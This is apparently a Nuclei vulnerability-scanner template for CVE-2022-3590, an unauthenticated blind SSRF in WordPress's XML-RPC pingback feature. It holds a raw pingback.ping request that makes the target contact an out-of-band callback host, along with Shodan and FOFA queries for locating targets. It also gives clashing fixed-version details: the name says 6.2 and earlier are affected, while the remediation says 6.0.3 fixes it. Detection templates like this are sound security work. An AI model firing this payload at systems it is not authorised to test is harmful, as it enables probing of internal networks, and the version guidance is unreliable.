flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - internal: true
    part: body
    regex:
    - WordPress\s+(?:[1-5]\.\d+(?:\.\d+)?|6\.[0-2](?:\.\d+)?)
    type: regex
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}'
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, '<methodResponse>','faultCode','<fault>')
    - contains(content_type, 'text/xml')
    - contains(interactsh_protocol, 'dns')
    type: dsl
  raw:
  - "POST /xmlrpc.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<?xml\
    \ version=\"1.0\"?>\n<methodCall>\n  <methodName>pingback.ping</methodName>\n\
    \  <params>\n    <param>\n      <value><string>http://{{interactsh-url}}/</string></value>\n\
    \    </param>\n    <param>\n      <value><string>{{RootURL}}/?p=1</string></value>\n\
    \    </param>\n  </params>\n</methodCall>\n"
id: CVE-2022-3590
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-3590
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 5.9
    cwe-id: CWE-367
    epss-percentile: 0.99452
    epss-score: 0.8804
  description: 'WordPress is affected by an unauthenticated blind SSRF in the pingback
    feature. Because of a TOCTOU race condition between the validation checks and
    the HTTP request, attackers can reach internal hosts that are explicitly forbidden.

    '
  impact: 'Unauthenticated attackers can exploit a race condition in the WordPress
    pingback feature to perform blind SSRF attacks, potentially accessing internal
    network resources, cloud metadata endpoints, or other restricted internal services
    that are explicitly forbidden by validation checks.

    '
  metadata:
    fofa-query: body="oembed" && body="wp-"
    max-request: 1
    product: wordpress
    shodan-query:
    - cpe:"cpe:2.3:a:wordpress:wordpress"
    - http.component:"wordpress"
    vendor: wordpress
    verified: true
  name: WordPress <= 6.2 - Server Side Request Forgery
  reference:
  - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
  - https://www.sonarsource.com/blog/wordpress-core-unauthenticated-blind-ssrf/
  remediation: 'Update WordPress to version 6.0.3 or later that properly handles TOCTOU
    race conditions in the pingback feature.

    '
  severity: medium
  tags: cve,cve2022,wordpress,wpscan,ssrf,oast,oob,vkev,vuln
